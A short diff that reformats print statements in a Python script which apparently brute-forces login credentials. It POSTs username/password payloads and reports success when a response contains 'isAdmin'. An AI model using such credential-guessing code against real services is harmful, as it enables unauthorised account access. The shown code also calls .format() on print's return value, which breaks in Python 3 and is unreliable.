@@ -96,14 +96,18 @@ def send_request_with_username(username, passwords):
 
     # print(payload)
 
-    print("[+] sending POST request with payload... ({} credentials in total checked)".format(total))
+    print(
+        "[+] sending POST request with payload... ({} credentials in total checked)".format(total))
     resp = requests.post(url, headers=h, data=payload)
 
     if resp.status_code == 200:
         print("[+] response HTTP 200 OK received, analysing results...")
         # p0wned. This is the end :P
         if b"isAdmin" in resp.content:
-            print("[+] SUCCESS !!! Matching username/password for {} found!, please review response content for details...").format(username)
+            print(
+                "[+] SUCCESS !!! Matching username/password for {} found!,"
+                + "please review response content for details..."
+                  ).format(username)
             output.write(resp.content)
             exit(0)
 
